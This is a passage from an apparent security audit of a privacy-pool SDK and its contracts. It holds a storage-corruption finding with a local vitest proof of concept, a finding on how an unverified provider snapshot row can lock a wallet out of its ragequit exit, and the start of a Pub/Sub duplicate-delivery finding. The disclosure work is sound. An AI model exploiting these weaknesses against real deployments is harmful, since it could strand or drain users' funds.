What the loss costs depends on the note. Notes whose spending material rides on-chain (deposits, sender change, withdrawal outputs and ordinary discoverable transfers, all `KIND_FULL`) are re-derivable: after the wipe `NoteManager.getSyncCursor` reports `0x0`, so the next `discoverNotes` rescans from genesis and rebuilds them with no user action. The unconditional exit is untouched as well, since `PoolSessionRagequit` builds its witness from the nullifying key, the revocable key and the note and consumes no deposit secret.

Blind payment-request notes are different, because the chain never carried their secret. `PaymentRequestService.generate` calls `CryptoService.generateSecret` once per slot: `randomBytes(48)` reduced to a BN254 scalar, fresh randomness independent of the `paymentId` and of the account seed the user's other keys derive from. Five candidate routes back to it are closed in source. The seed does not reach it, because `DerivedKeys` carries exactly `privateNullifyingKey`, `privateRevocableKey` and `viewingPrivateKey`, and the note secret is neither among them nor indexed off them. The `paymentId` does not reach it either: `derivePaymentPrivKey` re-derives the request's private key, but the slot secrets are independent draws, so recovering the `paymentId` restores discovery and not spending. The chain does not carry it, because a `KIND_BLIND` payload is `[noteAddressHash, value, tokenId, label]` by construction and `NoteComputationService.deserializeV2` throws `PayloadDecodeError` on any kind that is not `KIND_FULL`. The shared request does not carry it, because `PaymentRequest` ships `noteAddressHashes` alone and the type records that omission as deliberate. And no second holder exists to ask, since the sender's resolved recipient for a payment-request note is the discoverable-without-secrets variant, typed with `noteSecretsMap?: never`. Without the secret the note cannot be spent, because `WitnessPreparationService.buildTransactWitness` takes `noteSecret` as a private input, and it cannot be exited, because `PoolSessionRagequit` throws `RagequitAddresslessNoteError` for an addressless payment-key-flow note before proof generation.

One route remains open, and it is a precaution rather than a remedy. `PoolSessionExport.exportAccount` returns `NoteManager.exportState` and `PaymentRequestService.exportState` together, and the latter emits `noteSecretsMap` as an array of entries that `NoteSecretsMapCodec` accepts on the way back in, so a user who took an export before the corruption can restore the secrets.

Nothing in the source supports an expectation that such an export exists. `exportAccount` is never called automatically, on a schedule or by any default flow: there is no `setInterval`, no scheduler and no background task anywhere in `packages/sdk/src`, and the shipped tech design states that background synchronization is "intentionally not part of the interface". Every `NoteManager.flush` call site, in `PoolSessionNoteManager`, `PoolSessionNoteDiscovery`, `PoolSessionExport` and `TransactOrchestrator`, writes the live store, and none writes a second copy. Every non-test `exportAccount` call in the repository reads `.notes` in memory and discards the blob in the same expression, the only file write under `apps/sample/src` and `apps/sample/checks` writes association-set leaves, and `exportAccountSealed` has no caller outside the SDK's own tests. The one helper that does snapshot state to disk, `saveRecoverySnapshot` under `packages/swaps/test/helpers`, is reachable from no shipped path, does not go through `exportAccount`, and captures a single `PendingNote` plus the protocol keys and the state leaves, with no `noteSecretsMap` and no payment requests. The reference integration removed the one snapshot it had, and `loadActiveNote`'s docstring records why: it loads a note from chain state "replacing the old `account-export.json` round-trip", and a chain re-read cannot recover a blind payment-request secret.

Nothing warns the user either. The README's "Account Export/Import" section frames the feature as portability, "Back up and restore account state across sessions or devices", with "Keys are excluded from exports" as its only caveat, and the tech design's single risk note about the blob points the other way, warning that it "contains note secrets and payment-request `noteSecretsMap` entries in cleartext" and should be treated "as backup material for the same account, never as something to share". No README, tech-design page, JSDoc or runtime message states that a blind payment-request `noteSecret` exists in exactly one place; the closest is a constant's JSDoc noting in passing that the recipient holds the secret locally, "persisted on its `PaymentRequestRecord`". The one worked example is broken as well. `exportAccount` returns `Promise<AccountExport>`, but the README snippet is `const backup = session.exportAccount();` with no `await`, so an integrator following it persists a `Promise` that JSON-serialises to `{}`; only the later `session.importAccount(backup)` line would fail, at restore time or never. The tech-design page declares the same stale return type.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/storage/FileStorageService.ts#L88-L105
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/storage/FileStorageService.ts#L50-L66
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/storage/FileStorageService.ts#L107-L111
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/storage/NoteStorageAdapter.ts#L46-L54
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/storage/PaymentRequestStorageAdapter.ts#L57-L65
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/storage/LocalStorageService.ts#L20-L33
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/constant/StorageAdapter.ts#L5-L10
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteManager.ts#L61-L74
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/PaymentRequestService.ts#L108-L120
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/CryptoService.ts#L129-L136
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionExport.ts#L60-L76
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/README.md#L334-L347

#### Impact

Blind payment-request notes lose spending capability permanently for any user who did not take an export beforehand. There is no post-hoc recovery of any kind: after the write, the secret is not on chain, not in the shared request, not derivable from the seed or the `paymentId`, and not in the sender's hands. The funds stay in the pool and become unspendable by anyone, including their owner. The only defence is an `exportAccount` snapshot taken before the corruption, and nothing prompts it, schedules it, or performs it in any shipped artifact.

For every other note kind the same event costs a full rescan from genesis and the loss of local metadata: a serious usability failure, not a loss of funds. On a `FileStorageService` deployment the rescan and the loss both span every chain and owner sharing the file, and the note rescan is itself the write that destroys the payment-request secrets sitting in the same file: recovering the recoverable notes is what consummates the unrecoverable loss. The only signal the user gets is "No existing NoteManager state found in storage", at debug level, through a logger that may not be attached.

#### Proof of concept

The test below drops into `packages/sdk/test/unit/services/storage/` alongside the package's own `FileStorageService.test.ts` and runs under the existing vitest setup with no new scaffolding, no mocks and no network: `pnpm vitest run test/unit/services/storage/FileStorageProbe.test.ts` from `packages/sdk`. All four cases pass at this commit. It drives the real `FileStorageService` and the real `NoteStorageAdapter` imported from `src`, against a real temporary directory on disk.

Case A seeds a two-key store, one note record and one payment-request record, truncates the file to 80% of its length, which is the shape a mid-write crash leaves, and observes the fail-open in order: the secrets are still in the damaged bytes, `JSON.parse` throws, `FileStorageService.get` returns `null` for both keys with no error and no signal, and `NoteStorageAdapter.getState` then returns `null` rather than throwing `InvalidStorageStateError`, which is the compensating control named in `readStore`'s own comment, observed not firing. Case B is the loss itself: after the same truncation, a single `set` for a different chain and a different owner leaves a one-key file, and the note's spending secret, the payment request's `noteSecretsMap` entry and its private key are gone from the bytes. Case C is the anti-vacuity control: with no file present at all, the same `set` produces the same one-key file, so case B's result reflects damage being treated as absence rather than `set` being destructive by nature. Case D observes that the rename consumes the temporary file on success and that its path is the fixed, instance-independent `{filename}.json.tmp`.

What the probe does not establish, stated plainly. The seeded records are hand-written JSON rather than output from `NoteManager` or `PaymentRequestService`, so what is measured is the storage layer's behaviour with content in the file, not a note lifecycle end to end. The write in case B is a direct `set`; that `discoverNotes` reaches the same `set` through `NoteManager.flush` at the end of an ordinary scan, with no user decision, is established by reading the call sites rather than by execution. The self-recovery of ordinary `KIND_FULL` notes is established entirely by reading: `NoteManager` is never instantiated here, and neither the `0x0` sync cursor after the wipe nor the rescan that rebuilds those notes is exercised. So is the whole of the non-recoverability argument for blind payment-request secrets: the probe shows a placeholder string disappearing from a file and nothing more, and that the real secret is a fresh `randomBytes(48)` draw, absent from `DerivedKeys`, from the `paymentId` derivation, from the `KIND_BLIND` payload and from the shared `PaymentRequest`, is read from source in each of those places. Case D's name overreaches its assertions: it shows only that no `.tmp` file survives a successful write and that the path is fixed. The absence of an `fsync` between `writeFile` and `rename` is read from `writeStore`, not measured, and no crash, power loss or two-instance race was staged. `LocalStorageService` is not exercised at all, so the narrower browser-side behaviour is read rather than observed. Nothing here involves a fork, a chain or a deployment.

The accompanying `FileStorageProbe.test.ts` in full:

```ts
import { mkdtemp, readFile, writeFile, truncate, access } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { beforeEach, describe, expect, it } from "vitest";

import { FileStorageService, NoteStorageAdapter } from "../../../../src/internal.js";

/** Probe — corrupt read returns {} and the next set() renames a one-key store over it. */
describe("FileStorageService corrupt-read destroys the store", () => {
    let dirPath: string;
    const filename = "privacy-pool-notes";

    const ALICE_NOTES = "v1:note-manager-state:1:0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const ALICE_PAYREQ = "v1:payment-request-state:1:0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const BOB_NOTES_8453 = "v1:note-manager-state:8453:0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    beforeEach(async () => {
        dirPath = await mkdtemp(join(tmpdir(), "f37-"));
    });

    const filePath = () => join(dirPath, `${filename}.json`);

    async function seed(): Promise<void> {
        const store = {
            [ALICE_NOTES]: {
                syncCursor: "0x12345",
                notes: [
                    {
                        noteAddressHash: "0x01",
                        commitment: "0x02",
                        value: "0x0de0b6b3a7640000",
                        tokenId: "0x0000000000000000000000000000000000000000",
                        label: "0x03",
                        status: "ACTIVE",
                        ownerAddress: "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                        noteSecret: "0xDEADBEEFCAFEBABE_ALICE_SPEND_SECRET",
                        isOwned: true,
                        createdAtBlock: "0x1",
                        spentAtBlock: null,
                        txHash: "0x04",
                    },
                ],
            },
            [ALICE_PAYREQ]: {
                requests: [
                    {
                        paymentId: "0x99",
                        // The ONLY copy of these secrets: KIND_BLIND notes never put them on chain.
                        noteSecretsMap: [["0xhash1", "0xPAYMENT_REQUEST_SECRET_ONLY_COPY"]],
                        paymentPrivKey: "0xPAYMENT_PRIV_KEY",
                        status: "OPEN",
                    },
                ],
            },
        };
        await writeFile(filePath(), JSON.stringify(store), "utf-8");
    }

    it("A: a truncated store reads as {} although the secrets are still in the bytes", async () => {
        await seed();
        const full = await readFile(filePath(), "utf-8");
        await truncate(filePath(), Math.floor(full.length * 0.8)); // mid-write crash shape

        const damaged = await readFile(filePath(), "utf-8");
        expect(damaged).toContain("ALICE_SPEND_SECRET"); // recoverable by hand
        expect(() => JSON.parse(damaged)).toThrow(SyntaxError);

        const svc = new FileStorageService({ dirPath, filename });
        await expect(svc.get(ALICE_NOTES)).resolves.toBeNull(); // swallowed, no signal
        await expect(svc.get(ALICE_PAYREQ)).resolves.toBeNull();

        const adapter = new NoteStorageAdapter(1, svc, "0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
        await expect(adapter.getState()).resolves.toBeNull(); // no InvalidStorageStateError
    });

    it("B: the next set() overwrites every key in the file, including other chains/accounts", async () => {
        await seed();
        const full = await readFile(filePath(), "utf-8");
        await truncate(filePath(), Math.floor(full.length * 0.8));

        const svc = new FileStorageService({ dirPath, filename });
        // A different session: chain 8453, a different owner. It never touches Alice's keys.
        await svc.set(BOB_NOTES_8453, { syncCursor: "0x0", notes: [] });

        const after = await readFile(filePath(), "utf-8");
        const parsed = JSON.parse(after) as Record<string, unknown>;

        expect(Object.keys(parsed)).toEqual([BOB_NOTES_8453]); // one-key store
        expect(after).not.toContain("ALICE_SPEND_SECRET");
        expect(after).not.toContain("PAYMENT_REQUEST_SECRET_ONLY_COPY");
        expect(after).not.toContain("PAYMENT_PRIV_KEY");
    });

    it("C: control — an ABSENT store is not a data-loss event (ENOENT branch)", async () => {
        const svc = new FileStorageService({ dirPath, filename });
        await expect(svc.get(ALICE_NOTES)).resolves.toBeNull();
        await svc.set(BOB_NOTES_8453, { syncCursor: "0x0", notes: [] });
        const parsed = JSON.parse(await readFile(filePath(), "utf-8")) as Record<string, unknown>;
        expect(Object.keys(parsed)).toEqual([BOB_NOTES_8453]);
    });

    it("D: writeStore leaves no fsync and a fixed tmp path", async () => {
        const svc = new FileStorageService({ dirPath, filename });
        await svc.set(BOB_NOTES_8453, { syncCursor: "0x0", notes: [] });
        // rename consumed the tmp file on success; the path is deterministic and shared
        // by every instance over the same dirPath+filename.
        await expect(access(join(dirPath, `${filename}.json.tmp`))).rejects.toThrow();
    });
});
```

#### Recommendation

We recommend never writing a store whose read failed. Distinguish "file absent", where an empty object is the correct result, from "file present but unparseable", and on the latter refuse to write, surface the condition to the caller, and leave the damaged file intact for recovery; the same distinction is needed in `LocalStorageService.get`, which returns `null` for both. Carry that distinction far enough to reach the control `readStore`'s comment already names, either by propagating a distinct "corrupt" sentinel that `NoteStorageAdapter.getState` and `PaymentRequestStorageAdapter.getState` reject, or by having those adapters treat an emptied store as an error when a key was expected. The package already behaves this way elsewhere, since `EncryptedStorageService.get` throws `InvalidEncryptedRecord` rather than returning an empty value when the stored shape is wrong, and `NoteManager.importState` warns and resets to a full rescan on an incomplete export. We also recommend making `writeStore` match its own docstring: add an `fsync` between `writeFile` and `rename`, retain one prior generation rather than overwriting in place, and give the temporary file a unique suffix so that two instances sharing a directory cannot collide on the fixed `.tmp` path. For blind payment-request secrets, which have no second home at all, either derive them from the seed so they can be reconstructed or snapshot them automatically, since the export machinery already exists and already carries `noteSecretsMap`; what is missing is anything that invokes it.

We also recommend correcting the documentation that an integrator's only defence currently rests on. The "Account Export/Import" snippet in `packages/sdk/README.md` does not await `exportAccount`, which returns `Promise<AccountExport>`, so an integrator following it persists a serialised `Promise`, and the tech-design page declares the same return type as `AccountExport`. Both should be fixed together, and both should state what the current text omits: that a blind payment-request `noteSecret` exists in exactly one place, that losing the store loses the funds, and that an export taken beforehand is the only protection.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #006 — An unverified association-set snapshot row writes the terminal `EXITED` status over a spendable note

**Severity:** Medium · **Location:** `packages/contracts/src/contracts/PoolVault.sol` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** PRIV · **Status:** Open

#### Description

A deposit into the pool becomes a note, a private record that only the depositor can spend. An ordinary spend has to prove that the deposit is in the association set, the list of deposits the association-set provider has screened and admitted, so the provider decides what can move that way. Ragequit is the exit that does not ask: the owner proves ownership of the note on chain and takes the deposit straight back to their own address. The contract requires no association-set membership for it and cannot be paused against it, which is what makes it the guaranteed way out. Wallets reach that exit through the SDK in this repository, which also tracks the status of every note the user holds, partly by scanning the chain and partly from a snapshot of past events that the same provider serves over HTTP.

One row in that snapshot, naming a note the user still holds, marks that note `EXITED` in the SDK's own records. The reference client then refuses to build the ragequit proof for it, and the recoverable total the SDK reports falls by the note's full value, with no error and no warning. Nothing repairs that state. `EXITED` is terminal, the snapshot is cumulative and replayed in full on every sync, the chain-side pass reuses the handler that skips anything already `EXITED`, and the phantom-note purge does not consider a note whose commitment, its public identifier on chain, is genuinely there. Reinstalling and re-importing the account does not help either: a fresh client re-poisons itself on its first sync, as does every other client pointed at the same provider.

**Where it breaks.** Nothing between the feed and that write checks the row against the chain, and the same file holds every other provider-driven status write to a stricter standard:

- a note is marked spent only through a value derived from the user's own private key, which the provider cannot compute, so a fabricated row cannot match a note;
- a note is demoted to `REJECTED` only after the rejection is corroborated against the association set, and that demotion is reversible once the note's nullifier is confirmed unspent on chain;
- a note is marked `EXITED` on the provider's unverified word, and `EXITED` is the one status with no edge out of it.

The one write that cannot be taken back is the one write that is not checked.

The note stays spendable on chain and the exit stays open to anyone who can build the proof by other means, but the wallet holding it refuses to take that exit and reports the money as gone, for the price to the provider of one extra element in an array it already returns on every sync.

`PoolVault.ragequit` is the protocol's escape hatch, and on chain it is open. It gates on `msg.sender == _proof.ownerAddress()`, a non-zero proof value, `_commitmentExists`, `!_nullifierSpent`, `keystore.isKnownRoot`, and the ragequit verifier. It reads no association-set root and carries no `whenNotPaused` modifier. The association-set provider's designed on-chain lever sits elsewhere: `_validateAndVerify`, on the `transact` path that an ordinary spend takes, requires `_proof.associationSetRoot() == aspRegistry.latestASPRoot()`, and no equivalent check appears on the ragequit path. The provider therefore cannot close the exit itself; what it can close is the reference client's route to it, and the balance that client reports.

The reference client reaches the exit through `PoolSessionRagequit.prepareRageQuit`, which refuses before it starts if the local note is already marked `EXITED`:

```ts
const note = this.noteManager.getNote(commitment);

if (note.status === NoteStatus.EXITED) {
    throw new RagequitNoteAlreadyExitedError(commitment);
}
```

That status is writable by the provider's own feed. `PoolSessionNoteDiscovery` applies the association-set snapshot's ragequit rows through `processRagequitEvents`, which matches each row to a local note by commitment and marks it `EXITED` (the real function wraps the write in a `try` / `catch` converting an `InvalidStatusTransitionError` into a `StateInvariantViolation`, elided because it does not change the permitted transition):

```ts
for (const ragequit of events) {
    const note = commitmentToNote.get(ragequit.commitment);
    if (!note) continue;
    // Skip notes already EXITED — the ASP snapshot replays every
    // ragequit event on each discoverNotes call; EXITED -> EXITED is
    // a no-op, not an error.
    if (note.status === NoteStatus.EXITED) continue;
    // ... try {
    this.noteManager.updateNoteStatus(
        note.commitment,
        NoteStatus.EXITED,
        ragequit.blockNumber || fromBlockNumber,
    );
    // ... } catch (error) { /* InvalidStatusTransitionError -> StateInvariantViolation */ }
}
```

Nothing between the feed and that write verifies the row. The snapshot arrives over plain HTTP from `HttpASPDataProvider.getEventSnapshot`, against an endpoint that takes no block range and returns the whole history under one `snapshotBlockNumber` coverage claim. The row's commitment is a public value the provider chose, `commitmentToNote` is keyed on exactly that value, no chain read confirms a ragequit occurred, and the note's own nullifier, the secret-derived value that a real exit publishes on chain, is never consulted.

The status it writes is terminal. In `VALID_STATUS_TRANSITIONS`, the entry for `EXITED` is the singleton `{EXITED}`, with no edge out, while `INACTIVE`, `PENDING`, `ACTIVE` and `REJECTED` all permit a transition into it, so the row lands whatever the note's current state.

The write has a second consumer. `NoteManager.updateNoteStatus` ends by recomputing the aggregates of the note's lineage, the notes sharing one deposit's label, and `recomputeAggregates` filters the lineage to `ACTIVE` notes and sums `totalValue` over the survivors; the public-facing `computeAggregates` does the same over a `NoteLineage`. Both `computeAggregates` and `getAllLineages` are declared on the `INoteManager` interface, and `NoteManager` is exported from the SDK's `external.ts`. A single poisoned row therefore makes the SDK's reported lineage total understate the user's recoverable funds by exactly the poisoned note's `value`, with no error and no warning.

There is no supported way back inside the reference client. The snapshot is cumulative and is replayed in full on every discovery pass, as `processRagequitEvents` says in the comment quoted above. A fresh client does not repair the state: `discoverNotes` scans the chain, persists the note as `PENDING` and flushes, then calls `syncNotesStatus`, which builds the commitment map over all owned notes and calls `syncNotesStatusFromASP` before any chain reconciliation; that fetches the full snapshot and runs `processRagequitEvents` over it, the same row matches by commitment, and `PENDING` to `EXITED` is a permitted transition. Fresh state is re-poisoned on its first sync, as is every other client of this SDK pointed at the same provider.

The chain leg cannot repair it either. `syncNotesStatusFromChain` reuses the same `processRagequitEvents`, which `continue`s on `EXITED`, so the chain pass can only ever add ragequits, never withdraw one. `purgePhantomNotes` only ever calls `deleteNote`, and it skips any candidate whose commitment `getCommitmentTimestamp` confirms on chain, which the poisoned note's is, so the purge does not consider it. The chain gap-fill is separately gated on the provider's own reported coverage, since `syncNotesStatus` scans from chain only when the snapshot's returned block is below the requested head, though here that gate is redundant: the chain pass has no edge out of `EXITED` to offer.

Every sibling status write in this file is held to a stricter standard. The `SPENT` path is keyed through `buildNullifierMap`, whose keys are `computeNullifier(keystoreManager.getPrivateNullifyingKey(), note.commitment)`, derived from a secret the provider cannot compute, so a fabricated row cannot match a note. The demotion to `REJECTED` is corroborated before it is applied, under a named control in the code: "a lone 'rejected' status response must not strand a spendable note. Corroborate any rejection against the association set the ASP builds spend proofs from before demoting a note", with `null`, the set being unavailable, leaving the note's status untouched. `REJECTED` is also reversible, its transition set containing `ACTIVE`, with re-activation additionally gated on the note's nullifier being unspent on chain. The implemented standard is that no unverified provider status response may strand a spendable note, met with corroboration plus reversibility on the reversible path and absent on the one path that is irreversible.

The repository's own documentation draws the trust line in the same place. The doc comment on `trustedSnapshotBlock` states that the bound it computes "guards accidental loss ... and is not a defense against a lying ASP. Snapshot rows are unauthenticated (unlike association-set leaves, which are checked against the on-chain root)". The authenticated route agrees: `IpfsASPDataProvider` verifies the payload multihash against the on-chain CID, and its `getEventSnapshot` throws `ASPUnavailable("getEventSnapshot is not supported via IPFS")`, refusing to carry this payload. The event snapshot is therefore available only over the unauthenticated channel, and that channel is the default: `PoolSessionBuilder` returns an `IpfsASPDataProvider` only when `ipfsGatewayUrl` is set, and an `HttpASPDataProvider` otherwise.

Malice is not required: an honest provider with an indexing bug, a stale index, or a commitment collision in its own records produces the identical terminal write.

A corroborating on-chain read between the snapshot row and the terminal write, a nullifier-spent check or a `Ragequit` log read at the block the row names, or any edge out of `EXITED` in `VALID_STATUS_TRANSITIONS`, would falsify this. There is neither.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L206-L244
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L352-L358
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionRagequit.ts#L79-L94
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L900-L933
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L420-L437
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L484-L519
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L829-L851
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L330-L367
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/constant/NoteManager.ts#L27-L49
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteManager.ts#L122-L141
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/NoteManager.ts#L376-L390
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/aspDataProviders/HttpASPDataProvider.ts#L131-L136
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/aspDataProviders/IpfsASPDataProvider.ts#L96-L101
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionBuilder.ts#L849-L880

#### Impact

One unverified row does two things to the reference client, per note chosen by commitment.

It closes that client's route to the exit: `prepareRageQuit` throws `RagequitNoteAlreadyExitedError` and never builds the proof. The exit itself stays open: the nullifier is unspent and the commitment is still in the tree, so `PoolVault.ragequit` still succeeds for anyone who can build that proof by another means. No asset moves and no nullifier burns, and the note stays spendable by anyone holding its secret through a client that has not consumed the row.

It also makes the SDK report a wrong number. The terminal write drops the note from `activeNoteHashes`, so the lineage `totalValue` that `getAllLineages` and `computeAggregates` return understates recoverable funds by the poisoned note's `value`. Anything priced on that total is short by that amount with nothing to indicate it.

Neither effect is recoverable through a shipped path, and both survive reinstall and re-import while the provider serves the row. Two escapes exist: configuring the session with an IPFS gateway, so that `getEventSnapshot` throws and the range is rebuilt from chain; or building the ragequit proof outside the SDK. Both need an integrator-level change and knowledge of the cause, which the user cannot reach: the only signal is an error named `RagequitNoteAlreadyExitedError` asserting that the note was already exited, plus a quietly short balance. The row costs the provider one extra element in an array it already returns on every sync, with no transaction and nothing that distinguishes it from an honest row.

#### Recommendation

We recommend not letting the association-set feed write terminal note state. Treat its ragequit rows as hints and confirm each against the chain before applying it: accept a row only when the note's nullifier is observed spent on chain, or when the corresponding `Ragequit` log is read at the block the row names. This is the control the code already applies elsewhere, the rejection path corroborating against the association set before demoting and the `SPENT` path being keyed on a value the provider cannot forge, extended to the one path that is irreversible, and one confirmation call per claimed ragequit is negligible next to the discovery pass already running. Give `EXITED` a supported way back at the same time: add a reconciliation that re-reads the note's nullifier and restores the status when it was never spent, and admit the corresponding edge to `VALID_STATUS_TRANSITIONS` so that the restoration is expressible at all, since `syncNotesStatusFromChain` cannot serve that purpose as written, sharing `processRagequitEvents` and short-circuiting on `EXITED`. Gate the ragequit refusal on the chain rather than on local status, so that `prepareRageQuit` confirms the nullifier is spent before declining to build the guaranteed exit, and make the chain gap-fill independent of the provider's self-reported coverage, so that a snapshot claiming coverage cannot suppress the read that would contradict it.

We also recommend recording the provenance of the status. A note moved to `EXITED` by a snapshot row rather than by a verified chain event should be reported as such, so that a lineage total which excludes it is distinguishable from one the client confirmed.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #007 — Unguarded `markAwaitingDestination` lets a duplicate delivery rewind a `CONFIRMED` job into a second deposit

**Severity:** Medium · **Location:** `packages/relayer/dust-rescue-service/src/pubsub/pubsub.controller.ts` · **Bug:** Medium · **Payout:** High · **Novelty:** NEW · **Reach:** PERM · **Kill chain:** KC-03 · **Status:** Open

#### Description

A cross-chain reshield leaves a small residue stranded at the destination, and the dust-rescue service turns that residue back into a note for the user it belongs to. The relayer announces the transfer on a Pub/Sub topic, the service writes one job for it, and a sweep running on a timer walks that job forward one step at a time: wait for the bridge to deliver, measure what arrived, prove a deposit for that amount, broadcast it, confirm it on chain. Every one of those deposits is signed by a single wallet the operator funds, shared across every job and every destination chain. A job that reaches `CONFIRMED` is finished and drops out of the sweep's working set.

Pub/Sub delivers each message at least once, so the same announcement arrives twice from time to time, and an operator replaying a message by hand produces the same repeat hours later. The service is built for exactly that: the job document is created with a write that fails distinctly when the job already exists, and the handler catches that failure and logs the delivery as a no-op. The guard is real, and the log line says it worked.

**Where it breaks.** The state write that follows the guard is not inside it, so the two halves of the handler disagree about what a duplicate delivery does:

- creating the job is conditional, and a second delivery fails there and is logged as a no-op;
- setting the job's state is unconditional, a blind write of `AWAITING_DESTINATION` with no read of the state it overwrites and no precondition, and it runs on both paths.

So a duplicate for a job whose deposit was already built, broadcast, mined and confirmed puts that job back at the start of the pipeline and back into the sweep's working set, with nothing on the record showing that it moved backwards. Nothing further down the pipeline notices: the sweep dispatches on the job's state alone, and the bridge status is keyed by transaction hash rather than by balance, so the settled transfer still reports as delivered, the same amount is measured again, and a fresh deposit is proved and broadcast.

That second deposit carries a new commitment, the identifier the pool records for a deposit, so the pool has nothing to recognise it as a repeat and accepts it as an ordinary deposit, and on a native-asset job the shared wallet pays the rescued amount a second time out of the float every other pending job depends on.

Rescue jobs enter the dust-rescue service through a Pub/Sub push handled by `PubSubController.pending`. Creation is hardened against redelivery: `FirestoreDustRescueJobStore.createPending` writes the job document with Firestore's `create()` rather than `set()`, precisely so that a redelivered push fails distinctly, as `JobAlreadyExistsError`, instead of silently overwriting progress the first delivery already made. The controller catches that error and logs `Duplicate delivery for <sourceTxHash>, treating as no-op`.

It then advances the job anyway. The call to `markAwaitingDestination` sits outside the `try`, under a comment explaining that the two writes are deliberate, so it runs on both branches, the create branch and the duplicate branch alike. A redelivery therefore does the opposite of what the log line asserts.

The write has no guard of its own. `markAwaitingDestination` is a blind update of `state` to `AWAITING_DESTINATION` with no read of the job's current state, no Firestore precondition and no transaction, and `IDustRescueJobStore` exposes no compare-and-set primitive that any implementation could use instead. A read of the job's current state before that write, or any Firestore precondition on it, would make a duplicate delivery the no-op it is logged as, and the path holds neither.

That matters most for jobs that are already finished. `TERMINAL_STATES` is `BELOW_THRESHOLD`, `CONFIRMED`, `FAILED`, and `listNonTerminal` selects the sweep's working set with `where("state", "not-in", TERMINAL_STATES)`. A duplicate delivery for a job in terminal `CONFIRMED`, a rescue whose deposit was broadcast, mined and confirmed, rewinds it to `AWAITING_DESTINATION` and puts it back into the working set.

Redelivery is the transport's contract rather than an anomaly: at-least-once is Pub/Sub's push guarantee, and the controller's own comment cites it. Manual replay is also part of the service's operating posture, since the relayer logs that a dust-rescue job needs manual replay when registration fails, and an operator who republishes a message for a job that did in fact register produces the same rewind, potentially hours later. The damaging outcomes need a duplicate that lands after the job has passed `SUBMITTING`. A typical redelivery, an ack-deadline overrun retried within seconds, arrives while the job is still in `AWAITING_DESTINATION`, where the rewind is genuinely the no-op the log claims; Pub/Sub's retention-long retry with backoff and an operator replay both produce the late case, and neither guarantees it.

